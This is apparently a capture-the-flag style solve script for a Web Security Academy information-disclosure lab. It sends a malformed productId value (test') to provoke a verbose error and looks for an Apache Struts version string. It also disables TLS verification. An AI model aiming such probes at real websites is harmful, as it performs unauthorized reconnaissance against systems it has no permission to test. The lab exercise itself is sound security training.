#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Information Disclosure Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test'" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test'" 

Information disclosure in error messages solution: test'
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: test\'', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def info_disclosure(url, command):
    path = '/product?productId='
    path_command = path + command
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = requests.get(url + path_command, verify=False, proxies=proxies)
    else:
        r = requests.get(url + path_command, verify=False)
        # verify the response contains Apache Struts 2 2.3.31
        for line in r.content.splitlines():
            if (b'Apache Struts 2 2.3.31' in line):
                print("The framework version is: ")
                print(line.decode("utf-8"))
                print("(+) Information Disclosure Successful!")
        if (b'Apache' not in r.content):
            print("(-) Information Disclosure Failed")
        else: 
            pass

def main():
    
    print("(+) Exploiting Information Disclosure")
        
    info_disclosure(url, command)

if __name__ == "__main__":
    main()
